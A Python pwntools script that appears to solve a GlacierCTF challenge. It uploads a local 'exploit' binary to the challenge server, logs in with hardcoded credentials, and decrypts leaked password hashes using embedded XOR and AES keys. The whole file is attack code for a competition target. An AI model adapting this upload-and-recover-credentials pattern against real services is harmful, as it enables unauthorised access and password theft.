#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

import base64
import sys
from Crypto.Cipher import AES

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

xor_key = b"\x01\x35\xa7\x73\x3f\x55\x57\xc1\xa9\xac\x73\xf8\x09\x95\x9c\xe1\x2e\x0a\x70\xe3\xc2\x5b\x69\xbb\x0c\x39\xca\xbb\x31\x02\x2c\xc9";
aes_key = b"\xec\x12\x0d\x58\x47\x09\xc7\xca\x50\xe5\x7d\x08\x4f\x59\x28\xf4"

def hashpass(string):
    assert(len(string) <= 32)
    b_s = string.encode("ascii")

    fixed = b_s + b"\0" * (32 - len(b_s))
    print(len(fixed))


    cipher = AES.new(aes_key, AES.MODE_ECB)

    ct = byte_xor(xor_key, fixed)



    ret = cipher.encrypt(ct)
    print(base64.b64encode(ret))

def rev_hash(b):
    cipher = AES.new(aes_key, AES.MODE_ECB)
    pt = cipher.decrypt(b)
    plain = byte_xor(xor_key, pt)
    return plain

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or 'pwn.glacierctf.com'
port = int(args.PORT or 13374)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def rev_hash(b):
    cipher = AES.new(aes_key, AES.MODE_ECB)
    pt = cipher.decrypt(b)
    plain = byte_xor(xor_key, pt)
    return plain

# -- Exploit goes here --

io = start()

io.recvuntil(b"32kb\n")

with open("exploit", "rb") as f:
    data = f.read()
    b64 = base64.b64encode(data)
    io.writeline(b64)

io.recvuntil(b"Username:")
io.writeline(b"steve")
io.recvuntil(b"Password:")
io.writeline(b"H$g7FAKVR8f3&k!@wmMd6Vdk3rHSUrwg")
#io.interactive()
print(io.recvuntil(b"Starting to leak data:\n").decode("ascii"))
while True:
    line = io.recvline().decode("ascii").split(":")
    if len(line) < 2: break
    print(f"{line[0]}:{line[1].strip()}:{rev_hash(base64.b64decode(line[1])).decode('ascii')}")
    



